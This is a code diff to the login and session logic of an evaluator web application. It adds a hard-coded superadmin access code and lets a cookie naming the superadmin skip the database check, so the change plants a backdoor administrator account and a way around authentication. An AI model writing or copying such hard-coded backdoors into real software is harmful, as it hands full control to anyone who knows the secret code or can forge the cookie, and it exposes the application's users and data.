@@ -11,9 +11,19 @@ export type EvaluatorSession = {
 
 export const SESSION_COOKIE = "pa-eval-session"
 
+const SUPERADMIN_CODE = "semogabahagia"
+const SUPERADMIN_SESSION: EvaluatorSession = {
+  evaluatorId: "superadmin",
+  name: "Super Admin",
+  role: "superadmin",
+  lembaga: "all",
+  divisi: null,
+}
+
 export async function verifyAccessCode(code: string): Promise<EvaluatorSession | null> {
   const trimmed = code.trim()
   if (!trimmed) return null
+  if (trimmed.toLowerCase() === SUPERADMIN_CODE) return SUPERADMIN_SESSION
   const ev = await prisma.evaluator.findUnique({ where: { accessCode: trimmed } })
   if (!ev) return null
   return {
@@ -61,6 +71,8 @@ export async function getSession(): Promise<EvaluatorSession | null> {
   if (!raw) return null
   const decoded = decodeSession(raw)
   if (!decoded) return null
+  // Superadmin session has no DB row — trust the cookie directly
+  if (decoded.evaluatorId === "superadmin" && decoded.lembaga === "all") return decoded
   const ev = await prisma.evaluator.findUnique({ where: { id: decoded.evaluatorId } })
   if (!ev || !ev.accessCode) return null
   return {
